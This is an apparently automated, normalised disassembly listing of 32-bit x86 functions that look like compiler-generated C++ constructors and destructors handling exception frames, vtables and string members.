push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x34 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x34 ] r--data
mov eax [ esi - 0x34 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x34 ] r--data
mov eax [ esi - 0x34 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x34 ]
mov [ ecx + esi - 0x38 ] eax
mov eax [ esi - 0x34 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x3c ]
mov [ ecx + esi - 0x38 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ esi - 0x8 ] 0x8
jb r-xdata
mov [ esi - 0x8 ] 0x7
xor eax eax
mov [ esi - 0xc ] 0x0
mov [ esi - 0x1c ] ax
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ esi - 0x18 ]
mov eax [ edx - 0x1c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x1c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e520
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x34 ]
lea ecx [ edi + 0x34 ]
call sub_1001e420
test [ ebp + 0x8 ] 0x1
mov ecx [ edi + 0x40 ]
mov [ edi + 0x3c ] r--data
mov ecx [ ecx + 0x4 ]
mov [ ecx + edi + 0x40 ] r--data
mov [ edi + 0x34 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e570
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f667
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x2c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0x6
push [ ebp + 0xc ]
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov eax [ ebp + 0x10 ]
mov [ esi + 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x18 ] ax
mov eax esi
mov [ ebp + 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x28
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e6c0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f69b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0xc ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0xc ] 0x7
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e760
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x24 ]
mov ecx esi
call sub_1001e790
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e790
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x24 ]
call sub_1001e6c0
mov eax [ esi + 0x38 ]
lea edx [ esi + 0x54 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x30 ]
mov [ esi + 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x30 ] r--data
mov [ esi + 0x24 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001e850
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f667
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x30 ] r--data
mov [ esi + 0x38 ] r--data
mov [ esi + 0x24 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x2c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0x7
push [ ebp + 0xc ]
lea ecx [ esi + 0x38 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov eax [ ebp + 0x10 ]
mov [ esi + 0x1c ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x18 ] ax
mov eax esi
mov [ ebp + 0x28 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x28
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001e9a0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f69b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x24 ] r--data
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + esi - 0x28 ] eax
mov eax [ esi - 0x24 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x2c ]
mov [ ecx + esi - 0x28 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0xc ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0xc ] 0x7
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001ea40
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x24 ]
mov ecx esi
call sub_1001ea70
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001ea70
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x24 ]
call sub_1001e9a0
mov eax [ esi + 0x38 ]
lea edx [ esi + 0x54 ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x30 ]
mov [ esi + 0x2c ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x30 ] r--data
mov [ esi + 0x24 ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001eb30
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f73a
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x3c ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x44 ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x6
lea edi [ esi + 0x1c ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] eax
mov [ edi ] ax
mov [ ebp - 0x4 ] 0x7
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x48 ] r--data
mov [ esi + 0x50 ] r--data
mov [ esi + 0x3c ] r--data
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x44 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x4
push ecx
push 0x4
push [ ebp + 0xc ]
lea ecx [ esi + 0x50 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x5
mov [ ebp - 0x10 ] 0x7
lea eax [ ebp + 0x30 ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ ebp + 0x10 ]
mov [ esi + 0x34 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x28 ] 0x0
mov [ ebp + 0x18 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x44 ] 0x8
jb r-xdata
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x44 ] 0x7
mov [ ebp + 0x30 ] ax
mov eax esi
mov [ ebp + 0x40 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x40
push [ ebp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001ece0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f776
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x3c ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x3c ] r--data
mov eax [ esi - 0x3c ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x3c ] r--data
mov eax [ esi - 0x3c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x3c ]
mov [ ecx + esi - 0x40 ] eax
mov eax [ esi - 0x3c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x44 ]
mov [ ecx + esi - 0x40 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ esi - 0xc ] 0x8
jb r-xdata
mov [ esi - 0xc ] 0x7
xor eax eax
mov [ esi - 0x10 ] 0x0
mov [ esi - 0x20 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x24 ] 0x8
jb r-xdata
push [ esi - 0x20 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ esi - 0x24 ] 0x7
mov [ esi - 0x28 ] 0x0
mov [ esi - 0x38 ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x38 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001edb0
push ebp
mov ebp esp
push esi
lea esi [ ecx - 0x3c ]
mov ecx esi
call sub_1001ede0
test [ ebp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001ede0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f25b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
lea ecx [ esi + 0x3c ]
call sub_1001ece0
mov eax [ esi + 0x50 ]
lea edx [ esi + 0x6c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ esi + 0x48 ]
mov [ esi + 0x44 ] r--data
mov eax [ eax + 0x4 ]
mov [ eax + esi + 0x48 ] r--data
mov [ esi + 0x3c ] r--data
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_1001eea0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f809
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x1
cmp [ ebp + 0x14 ] 0x0
je r-xdata
push ecx
push 0x15
push [ ebp + 0xc ]
mov ecx esi
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x5
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x54 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x5c ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x18 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x6
lea edi [ esi + 0x30 ]
mov [ edi + 0x14 ] 0x7
mov [ edi + 0x10 ] eax
mov [ edi ] ax
mov [ ebp - 0x4 ] 0x7
lea eax [ ebp + 0x18 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x60 ] r--data
mov [ esi + 0x54 ] r--data
mov [ ebp - 0x4 ] 0x2
lea ecx [ esi + 0x5c ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x3
lea eax [ ebp + 0x30 ]
cmp edi eax
je r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
mov eax [ ebp + 0x10 ]
mov [ esi + 0x48 ] eax
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x2c ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
mov ecx edi
call sub_10003a20
xor eax eax
mov [ ebp + 0x2c ] 0x7
mov [ ebp + 0x28 ] 0x0
mov [ ebp + 0x18 ] ax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x44 ] 0x8
jb r-xdata
push [ ebp + 0x18 ]
call j_sub_1003f3e3#2
add esp 0x4
xor eax eax
mov [ ebp + 0x44 ] 0x7
mov [ ebp + 0x30 ] ax
mov eax esi
mov [ ebp + 0x40 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn 0x40
push [ ebp + 0x30 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f030
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f85c
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x54 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x54 ] r--data
mov eax [ esi - 0x54 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x54 ] r--data
mov eax [ esi - 0x54 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x54 ]
mov [ ecx + esi - 0x58 ] eax
mov eax [ esi - 0x54 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x5c ]
mov [ ecx + esi - 0x58 ] eax
mov [ ebp - 0x4 ] 0x1
cmp [ esi - 0x10 ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0x10 ] 0x7
mov [ esi - 0x14 ] 0x0
mov [ esi - 0x24 ] ax
mov [ ebp - 0x4 ] al
cmp [ esi - 0x28 ] 0x8
jb r-xdata
push [ esi - 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
mov [ esi - 0x28 ] 0x7
xor eax eax
mov [ esi - 0x2c ] 0x0
mov [ esi - 0x3c ] ax
mov [ ebp - 0x4 ] 0xffffffff
lea edx [ esi - 0x38 ]
mov eax [ edx - 0x1c ]
mov [ ebp - 0x10 ] edx
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x8 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x1c ]
mov [ ecx + edx - 0x20 ] eax
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x24 ]
mov [ ecx + edx - 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
mov eax [ edx - 0x1c ]
mov eax [ eax + 0x4 ]
mov [ eax + edx - 0x1c ] r--data
mov eax [ edx - 0x1c ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0xc ]
mov [ ecx + edx - 0x20 ] eax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x3c ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f160
push ebp
mov ebp esp
push esi
push edi
lea edi [ ecx - 0x54 ]
lea ecx [ edi + 0x54 ]
call sub_1001f030
test [ ebp + 0x8 ] 0x1
mov ecx [ edi + 0x60 ]
mov [ edi + 0x5c ] r--data
mov ecx [ ecx + 0x4 ]
mov [ ecx + edi + 0x60 ] r--data
mov [ edi + 0x54 ] r--data
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn 0x4
push edi
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f1b0
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f8e7
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0x4 ] 0x0
cmp [ ebp + 0x20 ] 0x0
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov eax [ eax + 0x8 ]
mov [ esi + eax ] r--data
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x30 ]
mov [ ecx + esi - 0x4 ] eax
mov eax [ esi ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x38 ]
mov [ ecx + esi - 0x4 ] eax
lea ecx [ esi + 0x4 ]
xor eax eax
mov [ ecx + 0x14 ] 0x7
mov [ ecx + 0x10 ] 0x0
mov [ ecx ] ax
mov [ ebp - 0x4 ] 0x5
lea eax [ ebp + 0x24 ]
cmp ecx eax
je r-xdata
mov [ esi ] r--data
mov [ esi + 0x3c ] r--data
mov [ esi + 0x40 ] r--data
mov [ esi + 0x30 ] r--data
mov [ ebp - 0x4 ] 0x1
lea ecx [ esi + 0x38 ]
mov eax [ ecx + 0x4 ]
mov [ ecx ] r--data
mov [ ebp - 0x10 ] 0x1
mov [ ebp - 0x18 ] ecx
mov eax [ eax + 0x4 ]
mov [ eax + ecx + 0x4 ] r--data
mov [ ebp - 0x4 ] 0x3
push ecx
push 0xa
push [ ebp + 0xc ]
lea ecx [ esi + 0x40 ]
mov [ ebp - 0x10 ] 0x3
push [ ebp + 0x8 ]
call sub_1001c950
mov [ ebp - 0x4 ] 0x4
mov [ ebp - 0x10 ] 0x7
mov eax [ ebp + 0x10 ]
mov [ esi + 0x1c ] eax
mov eax [ ebp + 0x14 ]
mov [ esi + 0x24 ] eax
mov eax [ ebp + 0x18 ]
mov [ esi + 0x28 ] eax
mov eax [ ebp + 0x1c ]
mov [ esi + 0x20 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp + 0x38 ] 0x8
jb r-xdata
push 0xffffffff
push 0x0
push eax
call sub_10003a20
xor eax eax
mov [ ebp + 0x38 ] 0x7
mov [ ebp + 0x24 ] ax
mov eax esi
mov [ ebp + 0x34 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn 0x34
push [ ebp + 0x24 ]
call j_sub_1003f3e3#2
add esp 0x4
sub_1001f320
push ebp
mov ebp esp
push 0xffffffff
push sub_1004f91b
mov eax [ fs : 0x0 ]
push eax
push ecx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov esi ecx
mov [ ebp - 0x10 ] esi
mov eax [ esi - 0x30 ]
mov eax [ eax + 0x4 ]
mov [ eax + esi - 0x30 ] r--data
mov eax [ esi - 0x30 ]
mov eax [ eax + 0x8 ]
mov [ eax + esi - 0x30 ] r--data
mov eax [ esi - 0x30 ]
mov ecx [ eax + 0x4 ]
lea eax [ ecx - 0x30 ]
mov [ ecx + esi - 0x34 ] eax
mov eax [ esi - 0x30 ]
mov ecx [ eax + 0x8 ]
lea eax [ ecx - 0x38 ]
mov [ ecx + esi - 0x34 ] eax
mov [ ebp - 0x4 ] 0xffffffff
cmp [ esi - 0x18 ] 0x8
jb r-xdata
xor eax eax
mov [ esi - 0x18 ] 0x7
mov [ esi - 0x1c ] 0x0
mov [ esi - 0x2c ] ax
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
mov esp ebp
pop ebp
retn
push [ esi - 0x2c ]
